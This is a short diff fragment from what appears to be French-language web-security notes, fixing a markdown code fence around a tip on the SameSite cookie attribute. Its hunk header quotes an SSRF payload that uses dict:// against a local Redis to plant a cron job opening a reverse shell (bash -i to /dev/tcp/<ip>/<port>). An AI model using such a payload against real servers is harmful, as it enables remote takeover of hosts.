@@ -206,7 +206,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 
 - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value
 
-````
+```
 Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 ```
 
